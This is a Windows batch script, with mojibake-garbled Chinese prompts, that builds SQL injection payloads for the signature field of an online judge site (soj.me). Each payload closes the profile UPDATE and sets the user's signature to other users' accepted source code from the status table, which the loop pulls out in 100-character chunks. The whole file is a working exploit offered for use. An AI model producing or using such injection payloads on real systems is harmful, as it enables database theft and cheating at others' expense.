@echo off
echo ******************GetSourceCode******************
echo �밴��ʾһ��һ����,���˾�Ҫ����...
rem goto :start
set /p username=����û�������¼ʱ�õ�):
set /p pid=��ĿID:
:getlang
set /p lang=�������ͣ�C++��C)?
if not "%lang%"=="C++" if not "%lang%"=="C" goto :getlang
:getnth
set /p nth=�ڼ���(Ĭ��Ϊ0,�Ҳ�����ʱ����ȡ�������֣�10���ڣ�?
if "%nth%"=="" set nth=0
if %nth% GTR 10 goto :getnth
if %nth% LSS 0 goto :getnth
:start
echo.
echo ע�⣡��
pause>nul
echo ���ƽ��򿪵ļ��±��ϵ����ݣ���Ҫ�����س�������¼���soj.me�趨��setting�������е�Signature�Ŀ��ڣ����ύ��signature�л����һЩ���ݣ����临�Ƶ�һ���µط����ɣ�
echo Ȼ��رռ��±������ظ����ɡ�
echo ��ס����
echo Press any key to continue...
pause>nul
echo ',signature=(select concat('/*\nlang:',language,'\ncodelen:',codelength,'\nsourcecodelen:',length(sourcecode^),'\nrun_time:',run_time,'\nrun_memory:',run_memory,'\nheadCode:',substr(sourcecode,1,50^),'\n*/'^) from status where pid=%pid% and status='Accepted' and language='%lang%' and length(sourcecode^) ^>0 order by codelength limit %nth%,1^) where username='%username%'# >%systemroot%\temp\mess.txt 
notepad %systemroot%\temp\mess.txt 
for /l %%i in (1,100,10000) do (
echo Again...
pause>nul
echo ',signature=(select substr(sourcecode,%%i,100^) from status where pid=%pid% and status='Accepted' and language='%lang%' and length(sourcecode^)^>0 order by length(sourcecode^) limit %nth%,1^) where username='%username%'#>%systemroot%\temp\mess.txt 
notepad %systemroot%\temp\mess.txt 
)
